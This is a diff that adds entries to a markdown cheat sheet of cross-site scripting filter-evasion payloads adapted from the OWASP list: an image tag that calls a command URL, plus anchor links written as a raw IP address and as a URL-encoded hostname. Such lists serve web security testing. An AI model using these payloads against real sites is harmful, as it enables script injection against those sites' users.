@@ -92,7 +92,17 @@ fetch('https://example.com/api/data', {
 ```js
 <<SCRIPT>alert("UwU");//\<</SCRIPT>
 ```
-
+> Img Embed XSS
+```js
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+```
+> IP vs Hostname / URL Encoded
+```js
+<A HREF="http://66.102.7.147/">XSS</A>
+```
+```js
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+```
 
 # Docs
 - https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
